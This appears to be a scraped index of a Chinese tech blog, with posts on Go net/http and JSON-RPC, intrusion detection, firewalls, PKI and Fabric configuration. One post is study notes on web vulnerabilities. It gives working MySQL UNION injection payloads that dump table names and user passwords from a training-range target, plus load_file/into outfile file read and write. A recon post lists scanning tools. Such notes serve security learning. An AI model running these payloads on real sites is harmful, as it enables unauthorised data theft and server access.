\u0026amp;Hello{\u0026#34;ruomu\u0026#34;}) ServeHTTP 方法其实对应的就是对应路由被访问时，对应的执行处理方法，至于具体什么时候被执行，如果绑定这些细节这里先不说了。\n是不是知道为什么，访问 localhost:8080/hello 会出现 hello ruomu了。\nHandleFunc 源码：\nfunc HandleFunc(pattern string, handler func(ResponseWriter, *Request)) { DefaultServeMux.HandleFunc(pattern, handler) } 我们发现和 Handle 的区别：\n第二个参数不一样，Handle 的第二个参数是一个Handler 类型的对象，而HandleFunc的第二个参数，直接就是一个 func(ResponseWriter, *Request)类型的函数 。\n里面执行的语句也有点不大相同，分别是 DefaultServeMux.Handle(pattern, handler) 和 DefaultServeMux.HandleFunc(pattern, handler)。它们也只是调用了不同的方法，并且第二个参数不同。。。感觉像是在套娃？ 这里先不展开说了，我们只需要知道它们是正正的注册路由的对象就行了。\n试想一下，如果我们需要绑定1000个路由和其对应的处理方法，那我们是不是要写1000个struct？\ntype r1 struct {} func (route r1) ServeHTTP(w http.ResponseWriter, r *http.Request) {...} type r2 struct {} func (route r2) ServeHTTP(w http.ResponseWriter, r *http.Request) {...} . . . type r1000 struct {} func (route r1000) ServeHTTP(w http.ResponseWriter, r *http.Request) {...} func main() { http.Handle(\u0026#34;/r1\u0026#34;, \u0026amp;r1{}) http.Handle(\u0026#34;/r2\u0026#34;, \u0026amp;r2{}) ... http.Handle(\u0026#34;/r100\u0026#34;, \u0026amp;r1000{}) http.ListenAndServe(\u0026#34;:8000\u0026#34;, nil) } 这样的代码是难以阅读并且难以维护的，我们根本就不需要这么多结构体，我们最终关心的其实时处理方法 ServeHTTP。\n看下前文的代码：\n... func indexHandler(w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, \u0026#34;hello world\u0026#34;) } ... http.HandleFunc(\u0026#34;/\u0026#34;, indexHandler) ... 是不是已经知道，如何改造绑定1000个路由的代码了。。\nHandlerFunc 源码：\ntype HandlerFunc func(ResponseWriter, *Request) // ServeHTTP calls f(w, r). func (f HandlerFunc) ServeHTTP(w ResponseWriter, r *Request) { f(w, r) } 这个写法很有意思啊。。\n其实目的也是解决绑定1000个路由需要定义1000个struct的问题。\n使用 HandlerFunc 进行强制类型转换，因为HandlerFunc也实现了 ServeHTTP方法，所以可以当做一个Handler类型的对象作为http.Handle的第二个参数。\n然后Handler的ServeHTTP方法中使用 f(w,r)，啊这。。秒啊。。\n... func indexHandler(w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, \u0026#34;hello world\u0026#34;) } ... http.Handle(\u0026#34;/\u0026#34;, http.HandlerFunc(indexHandler)) ... 现在是不是疑惑，HandleFunc 和 HandlerFunc有区别？为什么要两种写法呢。。\n其实我们继续看HandleFunc的源码就知道了：\nfunc HandleFunc(pattern string, handler func(ResponseWriter, *Request)) { DefaultServeMux.HandleFunc(pattern, handler) } ... func (mux *ServeMux) HandleFunc(pattern string, handler func(ResponseWriter, *Request)) { if handler == nil { panic(\u0026#34;http: nil handler\u0026#34;) } mux.Handle(pattern, HandlerFunc(handler)) } 可以看到，HandleFunc 最后还是使用了 Handle(pattern, HandlerFunc(handler)) 来处理的。。\nDefaultServeMux 这里顺便说一下，本文一开始的代码中，为什么 http.ListenAndServe(\u0026quot;:8000\u0026quot;, nil)第二个参数要传一个 nil 呢。\n关于ServeMux到时候另写一片文章，这里直接不细说。\nhttp.ListenAndServe 的第二个参数其实是一个ServeMux对象，如果不传的话，就会使用默认的 DefaultServeMux。\n这篇文章代码里使用的所有绑定路由的方法，都是绑定在 DefaultServeMux上的，如果我们使用 NewServeMux创建一个自定义对象，并且当做 http.ListenAndServe 的第二个参数传入的话，它们就会失效。\nnet/http/server.go:2835 func (sh serverHandler) ServeHTTP(rw ResponseWriter, req *Request) { handler := sh.srv.Handler if handler == nil { handler = DefaultServeMux } if req.RequestURI == \u0026#34;*\u0026#34; \u0026amp;\u0026amp; req.Method == \u0026#34;OPTIONS\u0026#34; { handler = globalOptionsHandler{} } handler.ServeHTTP(rw, req) } 总结 Handler 是一个接口，只有一个 ServeHTTP方法。 Handle 绑定路由第二个参数需要传一个Handler类型的对象。 HandlerFunc 写法比较有意思，他也实现了 ServeHTTP方法，可以强转一个函数为Handler类型的对象，并当做Handle 的第二个参数。 HandleFunc(pattern, handle) 写法等于 Handle(pattern, HandlerFunc(handle)) ps: 如果看不懂我写得东西很正常，本来就是记录不是什么教程，写得很随意。这里建议直接看参考链接里的文章。多看多练。\n参考链接：\nhttps://perennialsky.medium.com/understand-handle-handler-and-handlefunc-in-go-e2c3c9ecef03 https://cizixs.com/2016/08/17/golang-http-server-side/ https://learnku.com/articles/37867 ","date":"2021-10-07T16:39:17+08:00","permalink":"https://lizonglingo.github.io/p/%E5%85%B3%E4%BA%8Ehandlehandlefunchandler%E5%92%8Chandlerfunc/","title":"关于Handle、HandleFunc、Handler和HandlerFunc"},{"content":"RPC RPC（Remote Procedure Call）远程过程调用在分布式技术中常常用到例如Hyperledger Fabric中内部节点通信就用到了RPC，还有如今流行的微服务架构在内部模块的沟通之间也常常使用RPC进行通信。\n简单理解就是，本地机器调用远端服务机器上的方法，向远端机器指明要调用的方法、传入参数并拿回执行的结果。\nGolang中的RPC ”\ngolang的RPC支持三个级别的RPC：TCP、HTTP、JSONRPC。但Go的RPC包是独一无二的RPC，它和传统的RPC系统不同，它只支持Go开发的服务器与客户端之间的交互，因为在内部，它们采用了Gob来编码。\nGo RPC的函数只有符合下面的条件才能被远程访问，不然会被忽略，详细的要求如下：\n函数必须是导出的（首字母大写）。\n必须有两个导出类型的参数：\n1）第一个参数是接收的参数，\n2）第二个参数是返回给客户端的参数*result，它必须是指针类型的。\n函数要返回一个error。\n调用方法通常为：Service.Method。\n“\n来源：\ngolang中的rpc包用法 - andyidea - 博客园 (cnblogs.com)\nDemo 首先，假设函数func (DemoService) Div(args Args, result *float64) error {...}是我们需要调用的服务器上的函数，它的具体内容如下：\n// rpcdemo/rpc.go package rpcdemo import \u0026#34;errors\u0026#34; type DemoService struct { } // Args 由于有两个参数，所以构造一个 struct 作为参数 type Args struct { A, B int } // Div 调用 rpc 时， 使用 Service.Method，也就是 DemoService.Div func (DemoService) Div(args Args, result *float64) error { if args.B == 0 { return errors.New(\u0026#34;division by zero\u0026#34;) } *result = float64(args.A) / float64(args.B) return nil } 然后，在服务端注册该方法后，设置服务器监听请求的端口，连接到客户端后使用goroutine处理：\n// rpcdemo/server/serverRpc.go package main import ( \u0026#34;rpcdemo\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;net/rpc\u0026#34; \u0026#34;net/rpc/jsonrpc\u0026#34; ) func main() { // 向 rpc 注册服务 rpc.Register(rpcdemo.DemoService{}) // 设置服务端监听端口 listener, err := net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;:1234\u0026#34;) if err != nil { panic(err) } fmt.Println(\u0026#34;Open serverRcp, listening on Port 1234...\u0026#34;) for { // 监听端口到来的连接 conn, err := listener.Accept() if err != nil { log.Printf(\u0026#34;accept error: %v\u0026#34;, err) } fmt.Println(\u0026#34;Get request from client...\u0026#34;) go func() { jsonrpc.ServeConn(conn)\t// 开一个 goroutine 去做事情，这样还能继续接收别的连接 }() } } 让客户端连接相应的端口，发送请求并展示结果：\n// rpcdemo/client/clientRpc.go package main import ( \u0026#34;rpcdemo\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; \u0026#34;net/rpc/jsonrpc\u0026#34; ) func main() { // 首先客户端去连接端口 conn, err := net.Dial(\u0026#34;tcp\u0026#34;, \u0026#34;:1234\u0026#34;) if err != nil { panic(err) } // 告诉客户端使用该链接 client := jsonrpc.NewClient(conn) // 调用服务器上的方法 var result float64 err = client.Call(\u0026#34;DemoService.Div\u0026#34;, rpcdemo.Args{10, 3}, \u0026amp;result) fmt.Println(result, err) err = client.Call(\u0026#34;DemoService.Div\u0026#34;, rpcdemo.Args{10, 0}, \u0026amp;result) fmt.Println(result, err) } 依次运行服务器，客户端：\ns1-\u0026gt; go run rpcdemo/server/serverRpc.go ---------------------------------- s2-\u0026gt; Open serverRcp, listening on Port 1234... s4-\u0026gt; Get request from client... ================================== s3-\u0026gt; go run rpcdemo/client/clientRpc.go ---------------------------------- s5-\u0026gt; 3.3333333333333335 \u0026lt;nil\u0026gt; s6-\u0026gt; 3.3333333333333335 division by zero ","date":"2021-08-20T15:33:42+08:00","permalink":"https://lizonglingo.github.io/p/golang-jsonrpc-demo/","title":"Golang Jsonrpc Demo"},{"content":"Web漏洞导图 漏洞等级 高危：SQL注入、文件上传、文件包含、代码执行、未授权访问、命令执行\n中危：反序列化、逻辑安全\nSQL注入 MySql注入 判断注入 猜解列名、字段数量 order by int\n猜解准备，找报错 xxxx?id=-1 union select 1,2,3,4 寻找可以更改的字段\n信息收集\n数据库版本：version() 数据库名：database() 数据库用户：user() 操作系统：@@version_compile_os information_schema.tables：记录所有表名信息\ninformation_schema.columns：记录所有列名信息\n获取数据库mozhe_Discuz_StormGroup中的所有表名：\nid=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=\u0026#34;mozhe_Discuz_StormGroup\u0026#34; ​\t5.获取表StormGroup_member中所有列名：\nid=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=\u0026#34;StormGroup_member\u0026#34; 进行注入 id=-1 union select 1,name,password,4 from StormGroup_member limit 0,1 高权限注入 高权限注入指：拿到高权限用户如root的权限，可以通过注入一个数据库，间接获取另一个数据库的信息。\n获取所有数据库名： id=-1 union select 1, group_concat(schema_name), 3 from information_schema.schemata 拿到所有数据库名后，获取指定的dbtest数据库名下的表名信息： id=-1 union select 1, group_concat(table_name), 3 from information_schema.tables where table_schema=\u0026#39;dbtest\u0026#39; 知道表结构后，获取指定的tbtest下的列名信息： id=-1 union select 1, group_concat(column_name), 3 from information_schema.columns where table_name=\u0026#39;tbtest\u0026#39; and table_schema=\u0026#39;dbtest\u0026#39; 最后获取指定的dbtest数据库中的tbtest数据表相关的a、b列的信息： id=-1 union select 1, a, b, from dbtest.tbtest 文件读写 适用于MySql的操作函数：\n文件读取函数：load_file()\nselect load_file('filepath');\n文件导出函数：into outfile 或者 into dumpfile\nselect 'info' into outfile 'filepath';\n文件路径获取方法：\n报错显示、遗留文件、漏洞报错、平台配置文件、爆破等 ","date":"2021-08-09T16:32:12+08:00","permalink":"https://lizonglingo.github.io/p/web%E6%BC%8F%E6%B4%9E/","title":"Web漏洞"},{"content":"Web安全相关漏洞 Web源码类：SQL注入、上传、xss、代码执行、变量覆盖、逻辑漏洞、反序列化\u0026hellip; Web中间件类：中间件自身的漏洞问题 Web数据库类：使用的数据库自身的漏洞问题 Web系统层：服务器系统Linux、Windows\u0026hellip;等系统漏洞 第三方应用、app和pc结合类应用 信息收集思路 工具\u0026amp;网站 小迪渗透吧-提供最专业的渗透测试培训,web安全培训,网络安全培训,代码审计培训,安全服务培训,CTF比赛培训,SRC平台挖掘培训,红蓝对抗培训！_小迪安全,小迪渗透,小迪培训 (xiaodi8.com)\n御剑 - 后台扫描工具(目录结构)\n漏了个大洞 - APK提取反编译\nLayer子域名挖掘机 - 域名查询工具\n墨者学院_专注于网络安全人才培养 (mozhe.cn) - 在线靶场\nVulhub - Docker-Compose file for vulnerability environment - 使用Docker的漏洞环境集合，用于复现、研究漏洞\nShodan Search Engine\nSecurityTrails: Data Security, Threat Hunting, and Attack Surface Management Solutions for Security Teams\n同IP网站查询,C段查询,IP反查域名,C段旁注,旁注工具 (webscan.cc)\n首页 - 网络空间测绘,网络安全,漏洞分析,动态测绘,钟馗之眼,时空测绘,赛博测绘 - ZoomEye(\u0026ldquo;钟馗之眼\u0026rdquo;)网络空间搜索引擎\n网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统\nEnableSecurity/wafw00f: WAFW00F allows one to identify and fingerprint Web Application Firewall (WAF) products protecting a website. (github.com)\n全球 CDN 服务商查询_专业的 IP 地址库_IPIP.NET\ncrt.sh | Certificate Search\n高精度IP定位4 - openGPS.cn\nWAF扫描 EnableSecurity/wafw00f: WAFW00F allows one to identify and fingerprint Web Application Firewall (WAF) products protecting a website. (github.com)\n相关概念 CMS（Content Management System）：开源的网站内容管理系统，为建站提供便利 WAF（Web Application Firewall）：Web应用级防火墙 ","date":"2021-08-07T17:02:25+08:00","permalink":"https://lizonglingo.github.io/p/xiaodi%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/","title":"xiaodi安全笔记"},{"content":"概述 入侵检测是对网络传输进行即时监控，发现可疑传输时发出警报或者采取主动反应措施的网络安全技术。Intrusion Detection System入侵检测系统通过对“行为、安全日志、审计数据或其他网络上可以获取的信息以及计算机系统中若干关键点的信息”，检查网络或系统是否存在违反安全策略的行为和被攻击的迹象。\n分类 按照检测数据的来源分 Host-based IDS基于主机的入侵检测：通过收集主机的活动记录，能够较为准确检测到发生在主机系统高层的复杂攻击行为，采取关闭端口、结束进程等措施进行响应，会占用一定的计算、存储资源； Network-based IDS基于网络的入侵检测：以网络数据作为分析对象，判断主机或者网络是否发生入侵行为，无法发现主机内部攻击，无法直接采取响应措施，可以向其他安全组件报警 Hybrid Distributed IDS混合分布式入侵检测：从不同的主机系统、网络部件或者通过网络监听收集数据，分析事件发现可疑行为，提供集成的攻击签名、检测、报告和事件关联功能，部署和使用上更加方便 按使用的入侵检测分析方法分类 Misuse Detection误用检测：也被称为基于特征、基于知识的检测，根据掌握的入侵或攻击知识检测。定义入侵模式-\u0026gt;组建入侵模式库-\u0026gt;捕获流量数据进行比对。误报率低，不能检测到未知入侵。（比对异常行为） 异常检测：对正常系统状态下的系统行为建立模型，判定与正常行为模型不符的活动为可疑或者入侵行为。误警率较高。（比对正常行为） 混合检测：以模式发现为主，辅助以异常发现技术。 按系统体系结构分类 集中式IDS：集中的入侵检测服务器和分布在不同主机上的多个审计程序，审计数据由分散的主机审计程序收集后传到中央检测处理器。设计简单，易于实现；网络负担大，安全性较为脆弱，配置服务器复杂。 分布式IDS：主要针对复杂网络，各各组件分布在网络中不同的计算机或设备上，分布性主要体现在数据收集和数据分析上。 其他方式 在线IDS和离线IDS 主动响应系统和被动响应系统 连续IDS和周期性IDS 公共入侵检测框架 Common Intrusion Detection Framework是为了解决不同入侵检测系统的互操作性和共存的问题而提出的入侵检测框架。由四个部分组成：\nCIDF的体系结构\n在IDES入侵检测专家系统和NIDES其后继版本基础上提出了通用模型，将入侵检测系统分为四个基本组件：\n事件产生器：从IDS之外的计算环境中收集事件，转化成CIDF的GIDO（Generalized Intrusion Detection Objects统一入侵检测对象）格式传给其他组件 事件分析器：从其他组件收到GIDO，将产生的GIDO传给其他组件 响应单元：处理收到的GIDO，并据此采取响应的措施 事件数据库：存储GIDO CIDF的通信机制：三层模型有GIDO层（定义事件表示方法），消息层（传送数据），协商传输层（定义组件之间的传输机制）\nCIDF语言：为描述入侵检测响应IDR组件之间传输的信息，定义了Common Intrusion Specification Language公共入侵规范语言，来表示CIDF中的各种信息\nCIDF的API接口：负责GIDO编码、解码、传递\n入侵检测系统体系结构 集中式体系结构：优点是可以全面掌握采集到的数据，对入侵行为的分析更加精确；缺点是可扩展性差、分布式的数据采集会造成较高的网络负担，改变配置和加入新功能困难，存在单点失效的风险。 分布式体系结构：采用多个代理在网络的各部分分别执行入侵检测，并协作处理可能的入侵行为，其优点是能够较好的完成数据的采集和检测内外部的入侵；缺点在于如今层次化结构的网络难以处理不同层次的代理，每个代理对等地位，无法对时空跨度大的入侵行为进行准确的识别。 分层式体系结构：各检测单元被组织成为一个层次化的树状结构。 最底层负责收集信息进行初步处理，速度快数据量大，仅限于简单的入侵行为 中间层负责连接上下层代理，接受下层代理处理的结果进行较高层次的关联性分析输出，向高层代理进行数据和处理结果通报，中间层代理的加入减轻中央控制台的负载压力，提高系统可伸缩性 中央控制台处于最高层次，负责整体上对各级代理进行协调和管理 ","date":"2021-03-10T20:18:22+08:00","permalink":"https://lizonglingo.github.io/p/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF/","title":"入侵检测技术"},{"content":"防火墙概述 防火墙位于一个可信的内部网络与一个不可信的外界网络之间，用于保护内部网络免受非法用户的入侵。在内网和外网之间构筑保护层，通过网络路由和信息过滤实现网络的安全。\n防火墙的特性 内部网络和外部网络之间所有网络数据必须经过防火墙 只有符合安全策略的数据流才能通过防火墙 防火墙自身应具有非常强的抗攻击免疫力 防火墙的功能 网络安全的屏障，可以极大程度的提高内部网络的安全性，过滤不安全的服务降低风险 强化网络安全策略，以防火墙为中心，通过配置安全软件，集中安全管理 对网络存取和访问进行审计监控，记录日志、统计数据、以便分析 防范内部信息的外泄 主要缺陷 传统防火墙不能防范来自内部网络的攻击（新一代“分布式防火墙”则支持防范内部攻击） 防火墙不能防范不通过防火墙的攻击（必须让防火墙成为唯一的与外部网络连接的网络接口） 不能防范恶意代码的传输（防火墙不能扫描每一个数据包内的数据） 不能防范利用协议缺陷进行的攻击 不能防范利用服务器漏洞进行的攻击 不能防范未知的网络安全问题（被动式安全防护技术） 对已有的网络服务有一定的限制 性能评价指标 传输层性能指标 TCP并发连接数：穿越防火墙的主机之间或者主机与防火墙之间能同时建立的最大连接数 最大TCP连接速率：防火墙维持的最大TCP连接建立速度，用以体现防火墙更新链接状态表的最大速率和实施反应能力 网络层性能指标 吞吐量指标：没有丢帧情况下，防火墙能接受并转发的最大速率 时延指标：发送端口发出数据包经过防火墙后接收端口收到的时间间隔，有直通转发时延和存储转发时延两种 丢包率指标：正常稳定网络条件下，应该被转发但是由于缺少资源而没有被转发的数据包占全部数据包的百分比 背靠背缓冲指标：接受到以最小帧间隔传输的网络流量时，在不丢包的情况下所能处理的最大包数（缓冲能力） 应用层性能指标 HTTP传输速率：被请求的目标数据通过防火墙的平均传输速率 最大HTTP事务处理速率：用户访问目标时，所能达到的最大速率 功能评价指标 服务平台支持：常见的系统平台如Linux、Unix等 LAN口支持：LAN口的类型、带宽、口数 协议支持：主要指对非TCP/IP协议族的支持，如IPX等 VPN支持：是否支持虚拟专网VPN功能，提供建立VPN隧道所需的IPSec、PPTP、专用协议以及在VPN中使用TCP/IP 加密支持：主要指是否支持VPN加密需要的加密算法如DES、3DES、RC4以及特殊的加密算法和硬件加密功能 认证支持：主要指防火墙提供的认证方式，如RADIUS、Keberos、PKI、口令等方式 访问控制：主要指防火墙通过包过滤、应用代理或传输层代理方式，实现对网络资源的访问控制 NAT支持：是否提供NAT功能，隐藏内部网络结构，提高内网安全 日志支持：完善的日志记录、存储、管理等 其他：病毒扫描、内容过滤、抵御DOS/DDOS、脚本攻击、实时入侵防御、防范IP欺骗 防火墙规则制定的两种原则及其各自特点 防火墙规则的分类： 高级政策 用来定义受限制的网络许可和明确拒绝的服务内容、使用这些服务的方法以及例外条例\n低级政策 描述防火墙限制访问的具体实现及如何过滤高级政策定义的服务\n规则的特点： 保护内部信息资源的策略的实现和延伸 必须与网络访问活动密切相关 可靠稳妥，切合实际 实施各种不同的服务访问政策 设计原则： 拒绝访问一切未予特许的服务（侧重安全性） 允许访问一切未被特别拒绝的服务（侧重灵活性和方便性） 包过滤技术和应用网关技术的区别 包过滤技术也称分组过滤技术，在网络层截获网络数据包，根据防火墙规则表，检测攻击行为，在网络层提供低级别的安全防护和控制。\n应用网关技术又称为代理技术，采用协议代理服务，位于应用层，需要为每一种应用服务器设置专门的代理服务器。\n防火墙常见体系结构 筛选路由器体系结构 单宿主堡垒主机体系结构 双宿主堡垒主机体系结构 屏蔽子网体系结构 ","date":"2021-03-10T13:48:28+08:00","permalink":"https://lizonglingo.github.io/p/%E9%98%B2%E7%81%AB%E5%A2%99/","title":"防火墙"},{"content":"Public Key Infrastructure PKI技术以非对称密钥技术为基础，以数字证书为媒介，将各参与实体的标识信息与公钥绑定在一起。通过特定接口为用户提供安全服务，包括加密、解密、数字签名、身份认证等；具有透明性、易用性、可扩展性、互操作性、多用性、支持多平台等基础设施共有的特点。\nPKI系统内容 PKI系统主要包括以下内容： 认证中心CA：证书的签发机构；负责签发证书、验证身份、登记、发布证书撤销列表CRL 证书库：颁发证书和撤销证书集中存放地 密钥备份及恢复系统 证书撤销处理系统：Certificate Revocation List PKI应用接口系统 PKI应用系统包括： 认证中心CA X.500目录服务器：用于发布用户的证书以及证书注销列表 安全WWW服务器以及安全通信平台：通过SSL、IPsec等安全协议保证传输数据的机密性、完整性、真实性 安全应用系统 PKI提供的服务 安全登录 对终端用户透明：接口 全面的安全性：用统一的方式提供安全服务，保证信息的机密性、完整性、认证性、不可否认性 PKI体系结构 PAA Policy Approval Authority政策批准机构，创建PKI系统方阵、政策、批准PAA下属PCA政策，为PCA签发公钥证书，建立整个PKI体系的安全策略。\nPCA Policy Certification Authority政策认证机构，制定本PCA的具体政策，如密钥的产生、长度、证书有效期、CRL处理；并为下属CA签发公钥证书。\nCA Certificate Authority认证中心，担任具体的用户密钥对生成和签发，CRL的生成以及发布。核心功能是发放和管理数字证书。\n在Fabric中，CA为组织内部节点发放证书，包含用户公钥、标识等信息，用户证书被CA签名发放。通过CA，第三方用户可以验证用户持有的证书是否由信任的CA分发，以验证用户的合法身份。\nPEM格式：Privacy-Enhanced Mail 隐私增强邮件。\n此外，证书是公开的，因此不包含私钥信息。对于CA自己的证书，一般通过自签名为自己发放。\n以ca.example.com-cert.pem为例，这是一个证书文件，为了便于在网络上传送，通常证书会编码为PEM，如果我们直接查看它的内容：\n-----BEGIN CERTIFICATE----- MIICPjCCAeOgAwIBAgIQUkJOmiAwvlYsCrOusBHa8jAKBggqhkjOPQQDAjBpMQsw CQYDVQQGEwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQGA1UEBxMNU2FuIEZy YW5jaXNjbzEUMBIGA1UEChMLZXhhbXBsZS5jb20xFzAVBgNVBAMTDmNhLmV4YW1w bGUuY29tMB4XDTIxMDIwNDExMjgwMFoXDTMxMDIwMjExMjgwMFowaTELMAkGA1UE BhMCVVMxEzARBgNVBAgTCkNhbGlmb3JuaWExFjAUBgNVBAcTDVNhbiBGcmFuY2lz Y28xFDASBgNVBAoTC2V4YW1wbGUuY29tMRcwFQYDVQQDEw5jYS5leGFtcGxlLmNv bTBZMBMGByqGSM49AgEGCCqGSM49AwEHA0IABLobAhmABZmDnBUN7kYay3p9hX8K 3jC6gfo4cH+fMe15b1hwKCr5pcbyNrBLpzejsEu8HKLf6qjQgeqU99t8uOCjbTBr MA4GA1UdDwEB/wQEAwIBpjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw DwYDVR0TAQH/BAUwAwEB/zApBgNVHQ4EIgQgjWGUej/DLisEDcDHYMST4otUkW0k qigiB7mobi0r20MwCgYIKoZIzj0EAwIDSQAwRgIhALlqhswN20B9C5z5ZcPjtUsb BE90U8L7RoO/VMQSi/NbAiEApyA0DvYXtm4El8G8w+9D8aE/y4aQGq4d+QKHZYIn BXY= -----END CERTIFICATE----- 由于Fabric中采用X.509证书，我们使用openssl查看ca.example.com-cert.pem的可读格式的内容，下面是一个X.509证书的主要内容：\nC:\\Users\\HP\\Desktop\\test-network\\organizations\\ordererOrganizations\\example.com\\ca\u0026gt;openssl x509 -in ca.example.com-cert.pem -text -noout Certificate: Data: Version: 3 (0x2) Serial Number: 52:42:4e:9a:20:30:be:56:2c:0a:b3:ae:b0:11:da:f2\t# 序列号 Signature Algorithm: ecdsa-with-SHA256\t# 签名算法 Issuer: C = US, ST = California, L = San Francisco, O = example.com, CN = ca.example.com #发放机构 Validity\t# 有效期 Not Before: Feb 4 11:28:00 2021 GMT Not After : Feb 2 11:28:00 2031 GMT Subject: C = US, ST = California, L = San Francisco, O = example.com, CN = ca.example.com\t# 证书持有人 Subject Public Key Info: Public Key Algorithm: id-ecPublicKey Public-Key: (256 bit)\t# 公钥 pub: 04:ba:1b:02:19:80:05:99:83:9c:15:0d:ee:46:1a: cb:7a:7d:85:7f:0a:de:30:ba:81:fa:38:70:7f:9f: 31:ed:79:6f:58:70:28:2a:f9:a5:c6:f2:36:b0:4b: a7:37:a3:b0:4b:bc:1c:a2:df:ea:a8:d0:81:ea:94: f7:db:7c:b8:e0 ASN1 OID: prime256v1 NIST CURVE: P-256 X509v3 extensions: X509v3 Key Usage: critical Digital Signature, Key Encipherment, Certificate Sign, CRL Sign X509v3 Extended Key Usage: TLS Web Client Authentication, TLS Web Server Authentication X509v3 Basic Constraints: critical CA:TRUE X509v3 Subject Key Identifier: 8D:61:94:7A:3F:C3:2E:2B:04:0D:C0:C7:60:C4:93:E2:8B:54:91:6D:24:AA:28:22:07:B9:A8:6E:2D:2B:DB:43 Signature Algorithm: ecdsa-with-SHA256\t# CA对该证书的签名 30:46:02:21:00:b9:6a:86:cc:0d:db:40:7d:0b:9c:f9:65:c3: e3:b5:4b:1b:04:4f:74:53:c2:fb:46:83:bf:54:c4:12:8b:f3: 5b:02:21:00:a7:20:34:0e:f6:17:b6:6e:04:97:c1:bc:c3:ef: 43:f1:a1:3f:cb:86:90:1a:ae:1d:f9:02:87:65:82:27:05:76 CA证书的发放 离线发放：申请批准后，RA初始化申请者信息，在LDAP（Lightweight Directory Access Protocol）服务器添加信息；信息传给CA，生成参照号Ref.number以及认证码Auth.code；使用电子邮件或者打印，线下传递；申请人收到后在审查机构面对面领取证书，证书可存入光盘，软盘等 在线发放：申请批准后，RA初始化申请者信息，在LDAP（Lightweight Directory Access Protocol）服务器添加信息；信息传给CA，生成参照号Ref.number以及认证码Auth.code；申请人在本机登录网站通过浏览器安装Root CA证书，输入参照号和授权码获得证书。 CRL 证书废除原因主要有以下几点：\n密钥泄露：私钥泄露或者被破坏 从属变更：关于密钥的信息变更 终止使用：该密钥不再用于原来的用途或者证书已经到期 CA本身原因：CA系统私钥泄露 CA有理由怀疑证书细节不真实、不可信 证书持有者没有履行协议 证书持有者死亡、违反电子交易规则或者被判定为犯罪 ORA Online Register Authority在线证书审查机构进行申请者身份认证，向CA提交证书申请，验证接受CA签发的证书，发放给申请者。\nEE End Entity最终实体是PKI的最终使用者\n","date":"2021-03-09T09:28:11+08:00","permalink":"https://lizonglingo.github.io/p/pki%E6%8A%80%E6%9C%AF/","title":"PKI技术"},{"content":"Golang的接口特性 接口组装\n兼有python、c++的灵活性\n拥有java的类型检查\n接口由使用者定义\n接口的实现是隐式的，只要实现接口里的方法就行\n定义和使用接口 首先我们定义一个接口：\ntype Retriever interface { Get(url string) string\t// 这个接口要实现Get方法 } // 有这样一个函数，会使用Get方法 func download(r Retriever) string { return r.Get(\u0026#34;nothing\u0026#34;) } 然后，我们去实现它：\ntype retriever struct { Contents string } // 需要实现Get方法 func (r retriever) Get(url string) string { return r.Contents } 现在，我们有一个接口Retriever，它需要有一个Get方法。我们又定义了一个\nretriever对象，这个对象实现了Get方法，我们就可以说，retriever实现了Retriever这个接口，我们就可以用了。\nfunc main() { var r Retriever r = retriever{\u0026#34;my retriever\u0026#34;} fmt.Println(download(r)) } // my retriever // Process finished with exit code 0 ","date":"2021-02-21T17:37:03+08:00","permalink":"https://lizonglingo.github.io/p/golang%E6%8E%A5%E5%8F%A3/","title":"Golang接口"},{"content":" Hyperledger Fabric项目可以认为是一个BaaS - Blockchain as a Service，其主要的服务是为提供企业级的联盟链基础设施，多用于商业环境。和公有链不同的是，联盟链削弱中心化这一特性，通过灵活的身份准入、私有数据隔离、智能合约和链码等特性，使得使用者可以根据实际业务需求去设计自己的网络。而一个Fabric网络的结构，则依赖于许多网络配置文件。这些配置文件定义了参与网络的组织有哪些，每个组织的有哪些节点，以及这些节点的信息；除此之外，背书策略、排序策略、身份管理等内容也是通过这些配置文件来定义。\n网络启动流程 第一步 使用cryptogen工具生成参与网络组织实体的证书 cryptogen工具用于生成证书文件，PKI、CA、X.509、公钥体系等密码学基础为整个Fabric提供了底层的安全支持，实现可信成员对网络资源的合法访问。启动一个网络的第一步，就是生成证书，\n在Fabric2.2中，同先前所有生成证书的配置都在一个文件中不同的是，每一个组织在都有单独的配置文件来管理。test-network使用三个文件生成对应三个组织的证书，在脚本中，它们是这样的：\ncryptogen generate --config=./organizations/cryptogen/crypto-config-org1.yaml --output=\u0026#34;organizations\u0026#34; ... cryptogen generate --config=./organizations/cryptogen/crypto-config-org2.yaml --output=\u0026#34;organizations\u0026#34; ... cryptogen generate --config=./organizations/cryptogen/crypto-config-orderer.yaml --output=\u0026#34;organizations\u0026#34; ... 这几个文件的组织形式是这样的：\nroot@lizonglin-virtual-machine:/home/lizonglin/GoWork/src/github.com/fabric/scripts/fabric-samples/test-network/organizations# tree . ... ├── cryptogen │ ├── crypto-config-orderer.yaml │ ├── crypto-config-org1.yaml │ └── crypto-config-org2.yaml └── fabric-ca ├── ordererOrg │ └── fabric-ca-server-config.yaml ├── org1 │ └── fabric-ca-server-config.yaml ├── org2 │ └── fabric-ca-server-config.yaml └── registerEnroll.sh orderer组织，两个org分别由三个文件定义。\n使用cryptogen工具生成证书材料，三个文件内容如下：\ncrypto-config-orderer.yaml # --------------------------------------------------------------------------- # \u0026#34;OrdererOrgs\u0026#34; - Definition of organizations managing orderer nodes # --------------------------------------------------------------------------- OrdererOrgs: # orderer组织来管理orderer节点，定义orderer节点所属组织的信息 # --------------------------------------------------------------------------- # Orderer # --------------------------------------------------------------------------- - Name: Orderer\t# 组织名称 Domain: example.com\t# 组织域名 EnableNodeOUs: true\t# 是否在msp下生成config.yaml文件（许可为节点组织单元的一员） # --------------------------------------------------------------------------- # \u0026#34;Specs\u0026#34; - See PeerOrgs for complete description # --------------------------------------------------------------------------- Specs:\t# Hostname + Domain 组成了完整的Orderer组织的域名： orderer.example.name - Hostname: orderer SANS: 